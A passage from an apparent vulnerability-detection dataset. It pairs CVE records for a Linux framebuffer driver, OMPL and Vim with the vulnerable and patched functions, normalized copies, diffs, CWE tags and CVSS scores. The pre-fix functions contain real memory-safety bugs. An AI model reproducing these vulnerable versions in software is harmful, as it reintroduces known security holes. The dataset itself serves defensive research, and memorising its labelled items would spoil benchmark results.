type int.  Then, copy_from_user() may cause a heap overflow because it is used
as the third argument of copy_from_user().

Signed-off-by: Hyunwoo Kim <imv4bel@gmail.com>
Signed-off-by: Helge Deller <deller@gmx.de>",a09d2d00af53b43c6f11e6ab3cb58443c2cac8a7,https://github.com/torvalds/linux/commit/a09d2d00af53b43c6f11e6ab3cb58443c2cac8a7,drivers/video/fbdev/pxa3xx-gcu.c,pxa3xx_gcu_write,"static ssize_t
pxa3xx_gcu_write(struct file *file, const char *buff,
size_t count, loff_t *offp)
{
int ret;
unsigned long flags;
struct pxa3xx_gcu_batch*buffer;
struct pxa3xx_gcu_priv *priv = to_pxa3xx_gcu_priv(file);
int words = count / 4;
priv->shared->num_writes++;
priv->shared->num_words += words;
if (words >= PXA3XX_GCU_BATCH_WORDS)
return -E2BIG;
if (!priv->free) {
ret = pxa3xx_gcu_wait_free(priv);
if (ret < 0)
return ret;
}
spin_lock_irqsave(&priv->spinlock, flags);
buffer = priv->free;
priv->free = buffer->next;
spin_unlock_irqrestore(&priv->spinlock, flags);
ret = copy_from_user(buffer->ptr, buff, words * 4);
if (ret) {
spin_lock_irqsave(&priv->spinlock, flags);
buffer->next = priv->free;
priv->free = buffer;
spin_unlock_irqrestore(&priv->spinlock, flags);
return -EFAULT;
}
buffer->length = words;
buffer->ptr[words] = 0x01000000;
spin_lock_irqsave(&priv->spinlock, flags);
buffer->next = NULL;
if (priv->ready) {
BUG_ON(priv->ready_last == NULL);
priv->ready_last->next = buffer;
} else
priv->ready = buffer;
priv->ready_last = buffer;
if (!priv->shared->hw_running)
run_ready(priv);
spin_unlock_irqrestore(&priv->spinlock, flags);
return words * 4;
}","static ssize_t
pxa3xx_gcu_write(struct file *file, const char *VAR_0,
size_t VAR_1, loff_t *VAR_2)
{
int VAR_3;
unsigned long VAR_4;
struct pxa3xx_gcu_batch*VAR_5;
struct pxa3xx_gcu_priv *VAR_6 = to_pxa3xx_gcu_priv(file);
int VAR_7 = VAR_1 / 4;
VAR_6->shared->num_writes++;
VAR_6->shared->num_words += VAR_7;
if (VAR_7 >= VAR_8)
return -VAR_9;
if (!VAR_6->free) {
VAR_3 = pxa3xx_gcu_wait_free(VAR_6);
if (VAR_3 < 0)
return VAR_3;
}
spin_lock_irqsave(&VAR_6->spinlock, VAR_4);
VAR_5 = VAR_6->free;
VAR_6->free = VAR_5->next;
spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);
VAR_3 = copy_from_user(VAR_5->ptr, VAR_0, VAR_7 * 4);
if (VAR_3) {
spin_lock_irqsave(&VAR_6->spinlock, VAR_4);
VAR_5->next = VAR_6->free;
VAR_6->free = VAR_5;
spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);
return -VAR_10;
}
VAR_5->length = VAR_7;
VAR_5->ptr[VAR_7] = 0x01000000;
spin_lock_irqsave(&VAR_6->spinlock, VAR_4);
VAR_5->next = NULL;
if (VAR_6->ready) {
BUG_ON(VAR_6->ready_last == NULL);
VAR_6->ready_last->next = VAR_5;
} else
VAR_6->ready = VAR_5;
VAR_6->ready_last = VAR_5;
if (!VAR_6->shared->hw_running)
run_ready(VAR_6);
spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);
return VAR_7 * 4;
}",torvalds/linux/a09d2d00af53b43c6f11e6ab3cb58443c2cac8a7/pxa3xx-gcu.c/vul/before/0.json,"static ssize_t
pxa3xx_gcu_write(struct file *file, const char *buff,
		 size_t count, loff_t *offp)
{
	int ret;
	unsigned long flags;
	struct pxa3xx_gcu_batch	*buffer;
	struct pxa3xx_gcu_priv *priv = to_pxa3xx_gcu_priv(file);

	size_t words = count / 4;

	/* Does not need to be atomic. There's a lock in user space,
	 * but anyhow, this is just for statistics. */
	priv->shared->num_writes++;
	priv->shared->num_words += words;

	/* Last word reserved for batch buffer end command */
	if (words >= PXA3XX_GCU_BATCH_WORDS)
		return -E2BIG;

	/* Wait for a free buffer */
	if (!priv->free) {
		ret = pxa3xx_gcu_wait_free(priv);
		if (ret < 0)
			return ret;
	}

	/*
	 * Get buffer from free list
	 */
	spin_lock_irqsave(&priv->spinlock, flags);
	buffer = priv->free;
	priv->free = buffer->next;
	spin_unlock_irqrestore(&priv->spinlock, flags);


	/* Copy data from user into buffer */
	ret = copy_from_user(buffer->ptr, buff, words * 4);
	if (ret) {
		spin_lock_irqsave(&priv->spinlock, flags);
		buffer->next = priv->free;
		priv->free = buffer;
		spin_unlock_irqrestore(&priv->spinlock, flags);
		return -EFAULT;
	}

	buffer->length = words;

	/* Append batch buffer end command */
	buffer->ptr[words] = 0x01000000;

	/*
	 * Add buffer to ready list
	 */
	spin_lock_irqsave(&priv->spinlock, flags);

	buffer->next = NULL;

	if (priv->ready) {
		BUG_ON(priv->ready_last == NULL);

		priv->ready_last->next = buffer;
	} else
		priv->ready = buffer;

	priv->ready_last = buffer;

	if (!priv->shared->hw_running)
		run_ready(priv);

	spin_unlock_irqrestore(&priv->spinlock, flags);

	return words * 4;
}","static ssize_t
pxa3xx_gcu_write(struct file *file, const char *VAR_0,
		 size_t VAR_1, loff_t *VAR_2)
{
	int VAR_3;
	unsigned long VAR_4;
	struct pxa3xx_gcu_batch	*VAR_5;
	struct pxa3xx_gcu_priv *VAR_6 = to_pxa3xx_gcu_priv(file);

	size_t VAR_7 = VAR_1 / 4;

	/* COMMENT_0 */
                                               
	VAR_6->shared->num_writes++;
	VAR_6->shared->num_words += VAR_7;

	/* COMMENT_2 */
	if (VAR_7 >= VAR_8)
		return -VAR_9;

	/* COMMENT_3 */
	if (!VAR_6->free) {
		VAR_3 = pxa3xx_gcu_wait_free(VAR_6);
		if (VAR_3 < 0)
			return VAR_3;
	}

	/* COMMENT_4 */
                             
    
	spin_lock_irqsave(&VAR_6->spinlock, VAR_4);
	VAR_5 = VAR_6->free;
	VAR_6->free = VAR_5->next;
	spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);


	/* COMMENT_7 */
	VAR_3 = copy_from_user(VAR_5->ptr, VAR_0, VAR_7 * 4);
	if (VAR_3) {
		spin_lock_irqsave(&VAR_6->spinlock, VAR_4);
		VAR_5->next = VAR_6->free;
		VAR_6->free = VAR_5;
		spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);
		return -VAR_10;
	}

	VAR_5->length = VAR_7;

	/* COMMENT_8 */
	VAR_5->ptr[VAR_7] = 0x01000000;

	/* COMMENT_9 */
                            
    
	spin_lock_irqsave(&VAR_6->spinlock, VAR_4);

	VAR_5->next = NULL;

	if (VAR_6->ready) {
		BUG_ON(VAR_6->ready_last == NULL);

		VAR_6->ready_last->next = VAR_5;
	} else
		VAR_6->ready = VAR_5;

	VAR_6->ready_last = VAR_5;

	if (!VAR_6->shared->hw_running)
		run_ready(VAR_6);

	spin_unlock_irqrestore(&VAR_6->spinlock, VAR_4);

	return VAR_7 * 4;
}",torvalds/linux/a09d2d00af53b43c6f11e6ab3cb58443c2cac8a7/pxa3xx-gcu.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -7,7 +7,7 @@
 	struct pxa3xx_gcu_batch	*buffer;
 	struct pxa3xx_gcu_priv *priv = to_pxa3xx_gcu_priv(file);
 
-	int words = count / 4;
+	size_t words = count / 4;
 
 	/* Does not need to be atomic. There's a lock in user space,
 	 * but anyhow, this is just for statistics. */","{'deleted_lines': ['\tint words = count / 4;'], 'added_lines': ['\tsize_t words = count / 4;']}",True,"An issue was discovered in the Linux kernel before 5.19. In pxa3xx_gcu_write in drivers/video/fbdev/pxa3xx-gcu.c, the count parameter has a type conflict of size_t versus int, causing an integer overflow and bypassing the size check. After that, because it is used as the third argument to copy_from_user(), a heap overflow may occur. NOTE: the original discoverer disputes that the overflow can actually happen.",6.1,MEDIUM,1,valid,2022-06-20T14:17:46Z,4
CVE-2021-41490,['CWE-401'],AV:N/AC:L/Au:N/C:N/I:N/A:P,0,ompl,Addresses #833,5587c98a594e0452c06742d9c62134c2a5ecfbba,https://github.com/ompl/ompl/commit/5587c98a594e0452c06742d9c62134c2a5ecfbba,src/ompl/geometric/planners/prm/src/LazyPRM.cpp,ompl::geometric::LazyPRM::~LazyPRM,ompl::geometric::LazyPRM::~LazyPRM() = default;,ompl::geometric::LazyPRM::~VAR_0() = default;,ompl/5587c98a594e0452c06742d9c62134c2a5ecfbba/LazyPRM.cpp/vul/before/0.json,"ompl::geometric::LazyPRM::~LazyPRM()
{
    clear();
}","ompl::geometric::LazyPRM::~VAR_0()
{
    clear();
}",ompl/5587c98a594e0452c06742d9c62134c2a5ecfbba/LazyPRM.cpp/vul/after/0.json,"--- func_before
+++ func_after
@@ -1 +1,4 @@
-ompl::geometric::LazyPRM::~LazyPRM() = default;
+ompl::geometric::LazyPRM::~LazyPRM()
+{
+    clear();
+}","{'deleted_lines': ['ompl::geometric::LazyPRM::~LazyPRM() = default;'], 'added_lines': ['ompl::geometric::LazyPRM::~LazyPRM()', '{', '    clear();', '}']}",True,Memory leaks in LazyPRM.cpp of OMPL v1.5.0 can cause unexpected behavior.,7.5,HIGH,2,valid,2022-06-21T14:27:07Z,4
CVE-2022-2284,['CWE-122'],AV:N/AC:M/Au:N/C:P/I:P/A:P,0,vim,"patch 9.0.0017: accessing memory beyond the end of the line

Problem:    Accessing memory beyond the end of the line.
Solution:   Stop Visual mode when closing a window.",3d51ce18ab1be4f9f6061568a4e7fabf00b21794,https://github.com/vim/vim/commit/3d51ce18ab1be4f9f6061568a4e7fabf00b21794,src/window.c,win_close,"int
win_close(win_T *win, int free_buf)
{
win_T*wp;
intother_buffer = FALSE;
intclose_curwin = FALSE;
intdir;
inthelp_window = FALSE;
tabpage_T   *prev_curtab = curtab;
frame_T*win_frame = win->w_frame->fr_parent;
#ifdef FEAT_DIFF
inthad_diffmode = win->w_p_diff;
#endif
#ifdef MESSAGE_QUEUE
intdid_decrement = FALSE;
#endif
#if defined(FEAT_TERMINAL) && defined(FEAT_PROP_POPUP)
if (may_close_term_popup() == OK)
return OK;
#endif
if (ERROR_IF_ANY_POPUP_WINDOW)
return FAIL;
if (last_window())
{
emsg(_(e_cannot_close_last_window));
return FAIL;
}
if (win->w_closing || (win->w_buffer != NULL
&& win->w_buffer->b_locked > 0))
return FAIL;     if (win_unlisted(win))
{
emsg(_(e_cannot_close_autocmd_or_popup_window));
return FAIL;
}
if ((firstwin == aucmd_win || lastwin == aucmd_win) && one_window())
{
emsg(_(e_cannot_close_window_only_autocmd_window_would_remain));
return FAIL;
}
if (close_last_window_tabpage(win, free_buf, prev_curtab))
return FAIL;
if (bt_help(win->w_buffer))
help_window = TRUE;
else
clear_snapshot(curtab, SNAP_HELP_IDX);
if (win == curwin)
{
#ifdef FEAT_JOB_CHANNEL
leaving_window(curwin);
#endif
wp = frame2win(win_altframe(win, NULL));
if (wp->w_buffer != curbuf)
{
other_buffer = TRUE;
win->w_closing = TRUE;
apply_autocmds(EVENT_BUFLEAVE, NULL, NULL, FALSE, curbuf);
if (!win_valid(win))
return FAIL;
win->w_closing = FALSE;
if (last_window())
return FAIL;
}
win->w_closing = TRUE;
apply_autocmds(EVENT_WINLEAVE, NULL, NULL, FALSE, curbuf);
if (!win_valid(win))
return FAIL;
win->w_closing = FALSE;
if (last_window())
return FAIL;
#ifdef FEAT_EVAL
if (aborting())
return FAIL;
#endif
}
#ifdef FEAT_GUI
if (gui.in_use)
out_flush();
#endif
#ifdef FEAT_PROP_POPUP
if (popup_win_closed(win) && !win_valid(win))
return FAIL;
#endif
trigger_winclosed(win);
if (!win_valid_any_tab(win))
return OK;
win_close_buffer(win, free_buf ? DOBUF_UNLOAD : 0, TRUE);
if (only_one_window() && win_valid(win) && win->w_buffer == NULL
&& (last_window() || curtab != prev_curtab
|| close_last_window_tabpage(win, free_buf, prev_curtab)))
{
if (curwin->w_buffer == NULL)
curwin->w_buffer = curbuf;
getout(0);
}
if (curtab != prev_curtab && win_valid_any_tab(win)
&& win->w_buffer == NULL)
{
win_close_othertab(win, FALSE, prev_curtab);
return FAIL;
}
if (!win_valid(win) || last_window()
|| close_last_window_tabpage(win, free_buf, prev_curtab))
return FAIL;
++split_disallowed;
#ifdef MESSAGE_QUEUE
++dont_parse_messages;
#endif
wp = win_free_mem(win, &dir, NULL);
if (help_window)
{
win_T *prev_win = get_snapshot_curwin(SNAP_HELP_IDX);
if (win_valid(prev_win))
wp = prev_win;
}
if (win == curwin)
{
curwin = wp;
#ifdef FEAT_QUICKFIX
if (wp->w_p_pvw || bt_quickfix(wp->w_buffer))
{
for (;;)
{
if (wp->w_next == NULL)
wp = firstwin;
else
wp = wp->w_next;
if (wp == curwin)
break;
if (!wp->w_p_pvw && !bt_quickfix(wp->w_buffer))
{
curwin = wp;
break;
}
}
}
#endif
curbuf = curwin->w_buffer;
close_curwin = TRUE;
check_cursor();
}
if (p_ea && (*p_ead == 'b' || *p_ead == dir))
win_equal(curwin, curwin->w_frame->fr_parent == win_frame, dir);
else
win_comp_pos();
if (close_curwin)
{
#ifdef MESSAGE_QUEUE
did_decrement =
#else
(void)
#endif
win_enter_ext(wp,
WEE_CURWIN_INVALID | WEE_TRIGGER_ENTER_AUTOCMDS
| WEE_TRIGGER_LEAVE_AUTOCMDS | WEE_ALLOW_PARSE_MESSAGES);
if (other_buffer)
apply_autocmds(EVENT_BUFENTER, NULL, NULL, FALSE, curbuf);
}
--split_disallowed;
#ifdef MESSAGE_QUEUE
if (!did_decrement)
--dont_parse_messages;
#endif
last_status(FALSE);
if (help_window)
restore_snapshot(SNAP_HELP_IDX, close_curwin);
#ifdef FEAT_DIFF
if (diffopt_closeoff() && had_diffmode && curtab == prev_curtab)
{
intdiffcount = 0;
win_T*dwin;
FOR_ALL_WINDOWS(dwin)
if (dwin->w_p_diff)
++diffcount;
if (diffcount == 1)
do_cmdline_cmd((char_u *)""diffoff!"");
}
#endif
#if defined(FEAT_GUI)
if (gui.in_use && !win_hasvertsplit())
gui_init_which_components(NULL);
#endif
redraw_all_later(NOT_VALID);
return OK;
}","int
win_close(win_T *VAR_0, int VAR_1)
{
win_T*VAR_2;
intVAR_3 = FALSE;
intVAR_4 = FALSE;
intVAR_5;
intVAR_6 = FALSE;
tabpage_T   *VAR_7 = VAR_8;
frame_T*VAR_9 = VAR_0->w_frame->fr_parent;
#ifdef VAR_10
intVAR_11 = VAR_0->w_p_diff;
#endif
#ifdef VAR_12
intVAR_13 = FALSE;
#endif
#if defined(VAR_14) && defined(VAR_15)
if (may_close_term_popup() == VAR_16)
return VAR_16;
#endif
if (VAR_17)
return VAR_18;
if (last_window())
{
emsg(_(VAR_19));
return VAR_18;
}
if (VAR_0->w_closing || (VAR_0->w_buffer != NULL
&& VAR_0->w_buffer->b_locked > 0))
return VAR_18; 
if (win_unlisted(VAR_0))
{
emsg(_(VAR_20));
return VAR_18;
}
if ((VAR_21 == VAR_22 || VAR_23 == VAR_22) && one_window())
{
emsg(_(VAR_24));
return VAR_18;
}
if (close_last_window_tabpage(VAR_0, VAR_1, VAR_7))
return VAR_18;
if (bt_help(VAR_0->w_buffer))
VAR_6 = TRUE;
else
clear_snapshot(VAR_8, VAR_25);
if (VAR_0 == VAR_26)
{
#ifdef VAR_27
leaving_window(VAR_26);
#endif
VAR_2 = frame2win(win_altframe(VAR_0, NULL));
if (VAR_2->w_buffer != VAR_28)
{
VAR_3 = TRUE;
VAR_0->w_closing = TRUE;
apply_autocmds(VAR_29, NULL, NULL, FALSE, VAR_28);
if (!win_valid(VAR_0))
return VAR_18;
VAR_0->w_closing = FALSE;
if (last_window())
return VAR_18;
}
VAR_0->w_closing = TRUE;
apply_autocmds(VAR_30, NULL, NULL, FALSE, VAR_28);
if (!win_valid(VAR_0))
return VAR_18;
VAR_0->w_closing = FALSE;
if (last_window())
return VAR_18;
#ifdef VAR_31
if (aborting())
return VAR_18;
#endif
}
#ifdef VAR_32
if (VAR_33.in_use)
out_flush();
#endif
#ifdef VAR_15
if (popup_win_closed(VAR_0) && !win_valid(VAR_0))
return VAR_18;
#endif
trigger_winclosed(VAR_0);
if (!win_valid_any_tab(VAR_0))
return VAR_16;
win_close_buffer(VAR_0, VAR_1 ? VAR_34 : 0, TRUE);
if (only_one_window() && win_valid(VAR_0) && VAR_0->w_buffer == NULL
&& (last_window() || VAR_8 != VAR_7
|| close_last_window_tabpage(VAR_0, VAR_1, VAR_7)))
{
if (VAR_26->w_buffer == NULL)
VAR_26->w_buffer = VAR_28;
getout(0);
}
if (VAR_8 != VAR_7 && win_valid_any_tab(VAR_0)
&& VAR_0->w_buffer == NULL)
{
win_close_othertab(VAR_0, FALSE, VAR_7);
return VAR_18;
}
if (!win_valid(VAR_0) || last_window()
|| close_last_window_tabpage(VAR_0, VAR_1, VAR_7))
return VAR_18;
++VAR_35;
#ifdef VAR_12
++VAR_36;
#endif
VAR_2 = win_free_mem(VAR_0, &VAR_5, NULL);
if (VAR_6)
{
win_T *VAR_37 = get_snapshot_curwin(VAR_25);
if (win_valid(VAR_37))
VAR_2 = VAR_37;
}
if (VAR_0 == VAR_26)
{
VAR_26 = VAR_2;
#ifdef VAR_38
if (VAR_2->w_p_pvw || bt_quickfix(VAR_2->w_buffer))
{
for (;;)
{
if (VAR_2->w_next == NULL)
VAR_2 = VAR_21;
else
VAR_2 = VAR_2->w_next;
if (VAR_2 == VAR_26)
break;
if (!VAR_2->w_p_pvw && !bt_quickfix(VAR_2->w_buffer))
{
VAR_26 = VAR_2;
break;
}
}
}
#endif
VAR_28 = VAR_26->w_buffer;
VAR_4 = TRUE;
check_cursor();
}
if (VAR_39 && (*VAR_40 == 'b' || *VAR_40 == VAR_5))
win_equal(VAR_26, VAR_26->w_frame->fr_parent == VAR_9, VAR_5);
else
win_comp_pos();
if (VAR_4)
{
#ifdef VAR_12
VAR_13 =
#else
(void)
#endif
win_enter_ext(VAR_2,
VAR_41 | VAR_42
| VAR_43 | VAR_44);
if (VAR_3)
apply_autocmds(VAR_45, NULL, NULL, FALSE, VAR_28);
}
--VAR_35;
#ifdef VAR_12
if (!VAR_13)
--VAR_36;
#endif
last_status(FALSE);
if (VAR_6)
restore_snapshot(VAR_25, VAR_4);
#ifdef VAR_10
if (diffopt_closeoff() && VAR_11 && VAR_8 == VAR_7)
{
intVAR_46 = 0;
win_T*VAR_47;
VAR_48(dwin)
if (dwin->VAR_49)
++VAR_46;
if (VAR_46 == 1)
do_cmdline_cmd((char_u *)""diffoff!"");
}
#endif
#if defined(VAR_32)
if (VAR_33.in_use && !win_hasvertsplit())
gui_init_which_components(NULL);
#endif
redraw_all_later(VAR_50);
return VAR_16;
}",vim/3d51ce18ab1be4f9f6061568a4e7fabf00b21794/window.c/vul/before/0.json,"int
win_close(win_T *win, int free_buf)
{
    win_T	*wp;
    int		other_buffer = FALSE;
    int		close_curwin = FALSE;
    int		dir;
    int		help_window = FALSE;
    tabpage_T   *prev_curtab = curtab;
    frame_T	*win_frame = win->w_frame->fr_parent;
#ifdef FEAT_DIFF
    int		had_diffmode = win->w_p_diff;
#endif
#ifdef MESSAGE_QUEUE
    int		did_decrement = FALSE;
#endif

#if defined(FEAT_TERMINAL) && defined(FEAT_PROP_POPUP)
    // Can close a popup window with a terminal if the job has finished.
    if (may_close_term_popup() == OK)
	return OK;
#endif
    if (ERROR_IF_ANY_POPUP_WINDOW)
	return FAIL;

    if (last_window())
    {
	emsg(_(e_cannot_close_last_window));
	return FAIL;
    }

    if (win->w_closing || (win->w_buffer != NULL
					       && win->w_buffer->b_locked > 0))
	return FAIL; // window is already being closed
    if (win_unlisted(win))
    {
	emsg(_(e_cannot_close_autocmd_or_popup_window));
	return FAIL;
    }
    if ((firstwin == aucmd_win || lastwin == aucmd_win) && one_window())
    {
	emsg(_(e_cannot_close_window_only_autocmd_window_would_remain));
	return FAIL;
    }

    // When closing the last window in a tab page first go to another tab page
    // and then close the window and the tab page to avoid that curwin and
    // curtab are invalid while we are freeing memory.
    if (close_last_window_tabpage(win, free_buf, prev_curtab))
      return FAIL;

    // When closing the help window, try restoring a snapshot after closing
    // the window.  Otherwise clear the snapshot, it's now invalid.
    if (bt_help(win->w_buffer))
	help_window = TRUE;
    else
	clear_snapshot(curtab, SNAP_HELP_IDX);

    if (win == curwin)
    {
#ifdef FEAT_JOB_CHANNEL
	leaving_window(curwin);
#endif
	/*
	 * Guess which window is going to be the new current window.
	 * This may change because of the autocommands (sigh).
	 */
	wp = frame2win(win_altframe(win, NULL));

	/*
	 * Be careful: If autocommands delete the window or cause this window
	 * to be the last one left, return now.
	 */
	if (wp->w_buffer != curbuf)
	{
	    reset_VIsual_and_resel();	// stop Visual mode

	    other_buffer = TRUE;
	    win->w_closing = TRUE;
	    apply_autocmds(EVENT_BUFLEAVE, NULL, NULL, FALSE, curbuf);
	    if (!win_valid(win))
		return FAIL;
	    win->w_closing = FALSE;
	    if (last_window())
		return FAIL;
	}
	win->w_closing = TRUE;
	apply_autocmds(EVENT_WINLEAVE, NULL, NULL, FALSE, curbuf);
	if (!win_valid(win))
	    return FAIL;
	win->w_closing = FALSE;
	if (last_window())
	    return FAIL;
#ifdef FEAT_EVAL
	// autocmds may abort script processing
	if (aborting())
	    return FAIL;
#endif
    }

#ifdef FEAT_GUI
    // Avoid trouble with scrollbars that are going to be deleted in
    // win_free().
    if (gui.in_use)
	out_flush();
#endif

#ifdef FEAT_PROP_POPUP
    if (popup_win_closed(win) && !win_valid(win))
	return FAIL;
#endif

    // Trigger WinClosed just before starting to free window-related resources.
    trigger_winclosed(win);
    // autocmd may have freed the window already.
    if (!win_valid_any_tab(win))
	return OK;

    win_close_buffer(win, free_buf ? DOBUF_UNLOAD : 0, TRUE);

    if (only_one_window() && win_valid(win) && win->w_buffer == NULL
	    && (last_window() || curtab != prev_curtab
		|| close_last_window_tabpage(win, free_buf, prev_curtab)))
    {
	// Autocommands have closed all windows, quit now.  Restore
	// curwin->w_buffer, otherwise writing viminfo may fail.
	if (curwin->w_buffer == NULL)
	    curwin->w_buffer = curbuf;
	getout(0);
    }

    // Autocommands may have moved to another tab page.
    if (curtab != prev_curtab && win_valid_any_tab(win)
						      && win->w_buffer == NULL)
    {
	// Need to close the window anyway, since the buffer is NULL.
	win_close_othertab(win, FALSE, prev_curtab);
	return FAIL;
    }

    // Autocommands may have closed the window already or closed the only
    // other window.
    if (!win_valid(win) || last_window()
	    || close_last_window_tabpage(win, free_buf, prev_curtab))
	return FAIL;

    // Now we are really going to close the window.  Disallow any autocommand
    // to split a window to avoid trouble.
    // Also bail out of parse_queued_messages() to avoid it tries to update the
    // screen.
    ++split_disallowed;
#ifdef MESSAGE_QUEUE
    ++dont_parse_messages;
#endif

    // Free the memory used for the window and get the window that received
    // the screen space.
    wp = win_free_mem(win, &dir, NULL);

    if (help_window)
    {
	// Closing the help window moves the cursor back to the current window
	// of the snapshot.
	win_T *prev_win = get_snapshot_curwin(SNAP_HELP_IDX);

	if (win_valid(prev_win))
	    wp = prev_win;
    }

    // Make sure curwin isn't invalid.  It can cause severe trouble when
    // printing an error message.  For win_equal() curbuf needs to be valid
    // too.
    if (win == curwin)
    {
	curwin = wp;
#ifdef FEAT_QUICKFIX
	if (wp->w_p_pvw || bt_quickfix(wp->w_buffer))
	{
	    /*
	     * If the cursor goes to the preview or the quickfix window, try
	     * finding another window to go to.
	     */
	    for (;;)
	    {
		if (wp->w_next == NULL)
		    wp = firstwin;
		else
		    wp = wp->w_next;
		if (wp == curwin)
		    break;
		if (!wp->w_p_pvw && !bt_quickfix(wp->w_buffer))
		{
		    curwin = wp;
		    break;
		}
	    }
	}
#endif
	curbuf = curwin->w_buffer;
	close_curwin = TRUE;

	// The cursor position may be invalid if the buffer changed after last
	// using the window.
	check_cursor();
    }
    if (p_ea && (*p_ead == 'b' || *p_ead == dir))
	// If the frame of the closed window contains the new current window,
	// only resize that frame.  Otherwise resize all windows.
	win_equal(curwin, curwin->w_frame->fr_parent == win_frame, dir);
    else
	win_comp_pos();
    if (close_curwin)
    {
	// Pass WEE_ALLOW_PARSE_MESSAGES to decrement dont_parse_messages
	// before autocommands.
#ifdef MESSAGE_QUEUE
	did_decrement =
#else
	(void)
#endif
	    win_enter_ext(wp,
		WEE_CURWIN_INVALID | WEE_TRIGGER_ENTER_AUTOCMDS
		      | WEE_TRIGGER_LEAVE_AUTOCMDS | WEE_ALLOW_PARSE_MESSAGES);
	if (other_buffer)
	    // careful: after this wp and win may be invalid!
	    apply_autocmds(EVENT_BUFENTER, NULL, NULL, FALSE, curbuf);
    }

    --split_disallowed;
#ifdef MESSAGE_QUEUE
    if (!did_decrement)
	--dont_parse_messages;
#endif

    /*
     * If last window has a status line now and we don't want one,
     * remove the status line.
     */
    last_status(FALSE);

    // After closing the help window, try restoring the window layout from
    // before it was opened.
    if (help_window)
	restore_snapshot(SNAP_HELP_IDX, close_curwin);

#ifdef FEAT_DIFF
    // If the window had 'diff' set and now there is only one window left in
    // the tab page with 'diff' set, and ""closeoff"" is in 'diffopt', then
    // execute "":diffoff!"".
    if (diffopt_closeoff() && had_diffmode && curtab == prev_curtab)
    {
	int	diffcount = 0;
	win_T	*dwin;

	FOR_ALL_WINDOWS(dwin)
	    if (dwin->w_p_diff)
		++diffcount;
	if (diffcount == 1)
	    do_cmdline_cmd((char_u *)""diffoff!"");
    }
#endif

#if defined(FEAT_GUI)
    // When 'guioptions' includes 'L' or 'R' may have to remove scrollbars.
    if (gui.in_use && !win_hasvertsplit())
	gui_init_which_components(NULL);
#endif

    redraw_all_later(NOT_VALID);
    return OK;
}","int
win_close(win_T *VAR_0, int VAR_1)
{
    win_T	*VAR_2;
    int		VAR_3 = FALSE;
    int		VAR_4 = FALSE;
    int		VAR_5;
    int		VAR_6 = FALSE;
    tabpage_T   *VAR_7 = VAR_8;
    frame_T	*VAR_9 = VAR_0->w_frame->fr_parent;
#ifdef VAR_10
    int		VAR_11 = VAR_0->w_p_diff;
#endif
#ifdef VAR_12
    int		VAR_13 = FALSE;
#endif

#if defined(VAR_14) && defined(VAR_15)
    /* COMMENT_0 */
    if (may_close_term_popup() == VAR_16)
	return VAR_16;
#endif
    if (VAR_17)
	return VAR_18;

    if (last_window())
    {
	emsg(_(VAR_19));
	return VAR_18;
    }

    if (VAR_0->w_closing || (VAR_0->w_buffer != NULL
					       && VAR_0->w_buffer->b_locked > 0))
	return VAR_18; /* COMMENT_1 */
    if (win_unlisted(VAR_0))
    {
	emsg(_(VAR_20));
	return VAR_18;
    }
    if ((VAR_21 == VAR_22 || VAR_23 == VAR_22) && one_window())
    {
	emsg(_(VAR_24));
	return VAR_18;
    }

    /* COMMENT_2 */
    /* COMMENT_3 */
    /* COMMENT_4 */
    if (close_last_window_tabpage(VAR_0, VAR_1, VAR_7))
      return VAR_18;

    /* COMMENT_5 */
    /* COMMENT_6 */
    if (bt_help(VAR_0->w_buffer))
	VAR_6 = TRUE;
    else
	clear_snapshot(VAR_8, VAR_25);

    if (VAR_0 == VAR_26)
    {
#ifdef VAR_27
	leaving_window(VAR_26);
#endif
	/* COMMENT_7 */
                                                             
                                                       
    
	VAR_2 = frame2win(win_altframe(VAR_0, NULL));

	/* COMMENT_11 */
                                                                      
                                        
    
	if (VAR_2->w_buffer != VAR_28)
	{
	    reset_VIsual_and_resel();	/* COMMENT_15 */

	    VAR_3 = TRUE;
	    VAR_0->w_closing = TRUE;
	    apply_autocmds(VAR_29, NULL, NULL, FALSE, VAR_28);
	    if (!win_valid(VAR_0))
		return VAR_18;
	    VAR_0->w_closing = FALSE;
	    if (last_window())
		return VAR_18;
	}
	VAR_0->w_closing = TRUE;
	apply_autocmds(VAR_30, NULL, NULL, FALSE, VAR_28);
	if (!win_valid(VAR_0))
	    return VAR_18;
	VAR_0->w_closing = FALSE;
	if (last_window())
	    return VAR_18;
#ifdef VAR_31
	/* COMMENT_16 */
	if (aborting())
	    return VAR_18;
#endif
    }

#ifdef VAR_32
    /* COMMENT_17 */
    /* COMMENT_18 */
    if (VAR_33.in_use)
	out_flush();
#endif

#ifdef VAR_15
    if (popup_win_closed(VAR_0) && !win_valid(VAR_0))
	return VAR_18;
#endif

    /* COMMENT_19 */
    trigger_winclosed(VAR_0);
    /* COMMENT_20 */
    if (!win_valid_any_tab(VAR_0))
	return VAR_16;

    win_close_buffer(VAR_0, VAR_1 ? VAR_34 : 0, TRUE);

    if (only_one_window() && win_valid(VAR_0) && VAR_0->w_buffer == NULL
	    && (last_window() || VAR_8 != VAR_7
		|| close_last_window_tabpage(VAR_0, VAR_1, VAR_7)))
    {
	/* COMMENT_21 */
	/* COMMENT_22 */
	if (VAR_26->w_buffer == NULL)
	    VAR_26->w_buffer = VAR_28;
	getout(0);
    }

    /* COMMENT_23 */
    if (VAR_8 != VAR_7 && win_valid_any_tab(VAR_0)
						      && VAR_0->w_buffer == NULL)
    {
	/* COMMENT_24 */
	win_close_othertab(VAR_0, FALSE, VAR_7);
	return VAR_18;
    }

    /* COMMENT_25 */
    /* COMMENT_26 */
    if (!win_valid(VAR_0) || last_window()
	    || close_last_window_tabpage(VAR_0, VAR_1, VAR_7))
	return VAR_18;

    /* COMMENT_27 */
    /* COMMENT_28 */
    /* COMMENT_29 */
    /* COMMENT_30 */
    ++VAR_35;
#ifdef VAR_12
    ++VAR_36;
#endif

    /* COMMENT_31 */
    /* COMMENT_32 */
    VAR_2 = win_free_mem(VAR_0, &VAR_5, NULL);

    if (VAR_6)
    {
	/* COMMENT_33 */
	/* COMMENT_34 */
	win_T *VAR_37 = get_snapshot_curwin(VAR_25);

	if (win_valid(VAR_37))
	    VAR_2 = VAR_37;
    }

    /* COMMENT_35 */
    /* COMMENT_36 */
    /* COMMENT_37 */
    if (VAR_0 == VAR_26)
    {
	VAR_26 = VAR_2;
#ifdef VAR_38
